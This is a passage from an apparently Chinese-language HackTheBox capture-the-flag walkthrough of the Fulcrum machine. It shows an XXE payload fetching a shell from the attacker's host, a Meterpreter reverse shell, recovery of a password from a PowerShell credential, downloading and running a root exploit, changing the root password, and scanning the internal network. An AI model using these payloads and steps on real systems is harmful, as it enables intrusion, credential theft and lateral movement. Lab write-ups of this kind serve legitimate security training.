class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>143<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:4/index.php?page=http://10.10.16.3/shell&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.3:4444 <br>[*] Sending stage (39927 bytes) to 10.10.10.62<br>[*] Meterpreter session 1 opened (10.10.16.3:4444 -&gt; 10.10.10.62:60246) at 2022-09-03 09:51:52 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><h4 id="初始访问："><a href="#初始访问：" class="headerlink" title="初始访问："></a>初始访问：</h4><p>作为一个linux，居然有一个powershell脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; <span class="hljs-built_in">ls</span><br>Listing: /var/www/uploads<br>=========================<br><br>Mode              Size  Type  Last modified              Name<br>----              ----  ----  -------------              ----<br>100644/rw-r--r--  714   fil   2017-10-05 06:01:00 +0800  Fulcrum_Upload_to_Corp.ps1<br>100644/rw-r--r--  321   fil   2017-10-05 03:57:06 +0800  home.php<br>100644/rw-r--r--  255   fil   2017-10-06 03:08:22 +0800  index.php<br>100644/rw-r--r--  113   fil   2017-10-05 03:54:48 +0800  upload.php<br><br>meterpreter &gt; download Fulcrum_Upload_to_Corp.ps1<br>[*] Downloading: Fulcrum_Upload_to_Corp.ps1 -&gt; /home/crazyinside/HackTheBox/Fulcrum_Upload_to_Corp.ps1<br>[*] Downloaded 714.00 B of 714.00 B (100.0%): Fulcrum_Upload_to_Corp.ps1 -&gt; /home/crazyinside/HackTheBox/Fulcrum_Upload_to_Corp.ps1<br>[*] download   : Fulcrum_Upload_to_Corp.ps1 -&gt; /home/crazyinside/HackTheBox/Fulcrum_Upload_to_Corp.ps1<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Forward the PowerShell remoting port to the external interface</span><br><span class="hljs-comment"># Password is now encrypted \o/</span><br><br><span class="hljs-variable">$1</span> = <span class="hljs-string">&#x27;WebUser&#x27;</span><br><span class="hljs-variable">$2</span> = <span class="hljs-string">&#x27;77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48&#x27;</span> -<span class="hljs-built_in">split</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-variable">$3</span> = <span class="hljs-string">&#x27;76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=&#x27;</span> <br><span class="hljs-variable">$4</span> = <span class="hljs-variable">$3</span> | ConvertTo-SecureString -key <span class="hljs-variable">$2</span><br><span class="hljs-variable">$5</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-variable">$1</span>, <span class="hljs-variable">$4</span>)<br><br>Invoke-Command -Computer upload.fulcrum.local -Credential <span class="hljs-variable">$5</span> -File Data.ps1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$1</span> = <span class="hljs-string">&#x27;WebUser&#x27;</span>    <br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$2</span> = <span class="hljs-string">&#x27;77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48&#x27;</span> -<span class="hljs-built_in">split</span> <span class="hljs-string">&#x27;,&#x27;</span><br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$3</span> = <span class="hljs-string">&#x27;76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=&#x27;</span> <br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$4</span> = <span class="hljs-variable">$3</span> | ConvertTo-SecureString -key <span class="hljs-variable">$2</span><br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$5</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-variable">$1</span>, <span class="hljs-variable">$4</span>)<br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$5</span><br><br>UserName                     Password<br>--------                     --------<br>WebUser  System.Security.SecureString<br><br>┌──(crazyinside㉿ParrotOS)-[/home/crazyinside]<br>└─PS&gt; <span class="hljs-variable">$5</span>.GetNetworkCredential() | Format-List *<br><br>UserName       : WebUser<br>Password       : M4ng£m£ntPa55<br>SecurePassword : System.Security.SecureString<br>Domain         : <br></code></pre></td></tr></table></figure><p>powershell中PSCredential对象可以恢复密码。我觉得是内网某台windows主机上的，而我当前环境是一个linux，所以我开始枚举网络信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 5035 created.<br>Channel 1 created.<br>ifconfig<br>ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 10.10.10.62  netmask 255.255.255.0  broadcast 10.10.10.255<br>        inet6 fe80::250:56ff:feb9:21a8  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        inet6 dead:beef::250:56ff:feb9:21a8  prefixlen 64  scopeid 0x0&lt;global&gt;<br>        ether 00:50:56:b9:21:a8  txqueuelen 1000  (Ethernet)<br>        RX packets 319079  bytes 31518824 (31.5 MB)<br>        RX errors 0  dropped 71  overruns 0  frame 0<br>        TX packets 158545  bytes 50733938 (50.7 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 119145  bytes 24175896 (24.1 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 119145  bytes 24175896 (24.1 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>virbr0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255<br>        ether 52:54:00:97:17:b7  txqueuelen 1000  (Ethernet)<br>        RX packets 64680  bytes 29586894 (29.5 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 95842  bytes 10911830 (10.9 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>vnet0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet6 fe80::fc54:ff:fe9e:52f2  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether fe:54:00:9e:52:f2  txqueuelen 1000  (Ethernet)<br>        RX packets 1330  bytes 166128 (166.1 KB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 5135  bytes 382282 (382.2 KB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>vnet1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet6 fe80::fc54:ff:fe9e:52f3  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether fe:54:00:9e:52:f3  txqueuelen 1000  (Ethernet)<br>        RX packets 1082  bytes 164154 (164.1 KB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 4735  bytes 333045 (333.0 KB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>vnet2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet6 fe80::fc54:ff:fe9e:52f4  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether fe:54:00:9e:52:f4  txqueuelen 1000  (Ethernet)<br>        RX packets 63872  bytes 30420506 (30.4 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 99788  bytes 11125703 (11.1 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>route<br>cKernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160<br>10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160<br>192.168.122.0   0.0.0.0         255.255.255.0   U     0      0        0 virbr0<br>script /bin/bash /dev/null -qc<br>script: option requires an argument -- <span class="hljs-string">&#x27;c&#x27;</span><br>Try <span class="hljs-string">&#x27;script --help&#x27;</span> <span class="hljs-keyword">for</span> more information.<br>script -qc /bin/bash /dev/null<br>www-data@fulcrum:~/uploads$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>Fulcrum_Upload_to_Corp.ps1  home.php  index.php  upload.php<br>www-data@fulcrum:~/uploads$ <br></code></pre></td></tr></table></figure><p>还有一个192.168.122网段。我想直接用iptables转发，先提权了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@fulcrum:/tmp$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux fulcrum 5.4.0-77-generic <span class="hljs-comment">#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@fulcrum:/tmp$ iptables -a<br>iptables -a<br>iptables v1.8.4 (legacy): unknown option <span class="hljs-string">&quot;-a&quot;</span><br>Try `iptables -h<span class="hljs-string">&#x27; or &#x27;</span>iptables --<span class="hljs-built_in">help</span><span class="hljs-string">&#x27; for more information.</span><br><span class="hljs-string">www-data@fulcrum:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="hljs-string">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="hljs-string">/snap/snapd/15534/usr/lib/snapd/snap-confine</span><br><span class="hljs-string">/snap/core18/2074/bin/mount</span><br><span class="hljs-string">/snap/core18/2074/bin/ping</span><br><span class="hljs-string">/snap/core18/2074/bin/su</span><br><span class="hljs-string">/snap/core18/2074/bin/umount</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/chfn</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/chsh</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/gpasswd</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/newgrp</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/passwd</span><br><span class="hljs-string">/snap/core18/2074/usr/bin/sudo</span><br><span class="hljs-string">/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="hljs-string">/snap/core18/2074/usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">/snap/core18/2344/bin/mount</span><br><span class="hljs-string">/snap/core18/2344/bin/ping</span><br><span class="hljs-string">/snap/core18/2344/bin/su</span><br><span class="hljs-string">/snap/core18/2344/bin/umount</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/chfn</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/chsh</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/gpasswd</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/newgrp</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/passwd</span><br><span class="hljs-string">/snap/core18/2344/usr/bin/sudo</span><br><span class="hljs-string">/snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="hljs-string">/snap/core18/2344/usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/chfn</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/chsh</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/gpasswd</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/mount</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/newgrp</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/passwd</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/su</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/sudo</span><br><span class="hljs-string">/snap/core20/1434/usr/bin/umount</span><br><span class="hljs-string">/snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="hljs-string">/snap/core20/1434/usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/chfn</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/chsh</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/gpasswd</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/mount</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/newgrp</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/passwd</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/su</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/sudo</span><br><span class="hljs-string">/snap/core20/1026/usr/bin/umount</span><br><span class="hljs-string">/snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="hljs-string">/snap/core20/1026/usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="hljs-string">/usr/lib/eject/dmcrypt-get-device</span><br><span class="hljs-string">/usr/lib/snapd/snap-confine</span><br><span class="hljs-string">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="hljs-string">/usr/lib/openssh/ssh-keysign</span><br><span class="hljs-string">/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper</span><br><span class="hljs-string">/usr/bin/mount</span><br><span class="hljs-string">/usr/bin/sudo</span><br><span class="hljs-string">/usr/bin/pkexec</span><br><span class="hljs-string">/usr/bin/gpasswd</span><br><span class="hljs-string">/usr/bin/umount</span><br><span class="hljs-string">/usr/bin/passwd</span><br><span class="hljs-string">/usr/bin/fusermount</span><br><span class="hljs-string">/usr/bin/chsh</span><br><span class="hljs-string">/usr/bin/at</span><br><span class="hljs-string">/usr/bin/chfn</span><br><span class="hljs-string">/usr/bin/newgrp</span><br><span class="hljs-string">/usr/bin/su</span><br><span class="hljs-string">www-data@fulcrum:/tmp$ wget http://10.10.16.3/pwk.py</span><br><span class="hljs-string">wget http://10.10.16.3/pwk.py</span><br><span class="hljs-string">--2022-09-03 02:38:55--  http://10.10.16.3/pwk.py</span><br><span class="hljs-string">Connecting to 10.10.16.3:80... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 3448 (3.4K) [text/x-python]</span><br><span class="hljs-string">Saving to: &#x27;</span>pwk.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">pwk.py              100%[===================&gt;]   3.37K  --.-KB/s    in 0.08s   </span><br><span class="hljs-string"></span><br><span class="hljs-string">2022-09-03 02:38:56 (43.9 KB/s) - &#x27;</span>pwk.py<span class="hljs-string">&#x27; saved [3448/3448]</span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@fulcrum:/tmp$ python3 pwk.py</span><br><span class="hljs-string">python3 pwk.py</span><br><span class="hljs-string"># id</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="hljs-string"># script -qc /bin/bash /dev/null</span><br><span class="hljs-string">root@fulcrum:/root/.ssh# sudo passwd</span><br><span class="hljs-string">sudo passwd</span><br><span class="hljs-string">New password: CaiCaiwhoami</span><br><span class="hljs-string"></span><br><span class="hljs-string">Retype new password: CaiCaiwhoami</span><br><span class="hljs-string"></span><br><span class="hljs-string">passwd: password updated successfully</span><br><span class="hljs-string">root@fulcrum:/root/.ssh# </span><br></code></pre></td></tr></table></figure><p>直接更改root密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/.ssh$ ssh root@10.10.10.62          <br>root@10.10.10.62<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Sat 03 Sep 2022 02:46:03 AM UTC</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:             1.84</span><br><span class="hljs-string">  Usage of /:              95.1% of 27.43GB</span><br><span class="hljs-string">  Memory usage:            85%</span><br><span class="hljs-string">  Swap usage:              0%</span><br><span class="hljs-string">  Processes:               264</span><br><span class="hljs-string">  Users logged in:         0</span><br><span class="hljs-string">  IPv4 address for ens160: 10.10.10.62</span><br><span class="hljs-string">  IPv6 address for ens160: dead:beef::250:56ff:feb9:21a8</span><br><span class="hljs-string">  IPv4 address for virbr0: 192.168.122.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">  =&gt; / is using 95.1% of 27.43GB</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="hljs-string">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="hljs-string"></span><br><span class="hljs-string">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="hljs-string"></span><br><span class="hljs-string">161 updates can be applied immediately.</span><br><span class="hljs-string">85 of these updates are standard security updates.</span><br><span class="hljs-string">To see these additional updates run: apt list --upgradable</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Mon May  9 16:58:30 2022 from 10.10.14.11</span><br><span class="hljs-string">root@fulcrum:~# </span><br></code></pre></td></tr></table></figure><p>内网还有一台主机存活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># for i in &#123;1..254&#125;; do (ping -c 1 192.168.122.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br>64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.059 ms<br>64 bytes from 192.168.122.228: icmp_seq=1 ttl=128 time=7.32 ms<br>root@fulcrum:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>进行端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.228 80</span><br>Connection to 192.168.122.228 80 port [tcp/http] succeeded!<br>root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.228 88</span><br><br>^C<br>root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.228 21</span><br>^C<br>root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.228 445</span><br>^C<br>root@fulcrum:~<span class="hljs-comment"># nc -zv 192.168.122.228 5985</span><br>Connection to 192.168.122.228 5985 port [tcp/*] succeeded!<br>root@fulcrum:~<span class="hljs-comment"># iptables -n -L</span><br>Chain INPUT (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>LIBVIRT_INP  all  --  0.0.0.0/0            0.0.0.0/0           <br><br>Chain FORWARD (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>LIBVIRT_FWX  all  --  0.0.0.0/0            0.0.0.0/0           <br>LIBVIRT_FWI  all  --  0.0.0.0/0            0.0.0.0/0           <br>LIBVIRT_FWO  all  --  0.0.0.0/0            0.0.0.0/0           <br><br>Chain OUTPUT (policy ACCEPT)<br>target     prot opt <span 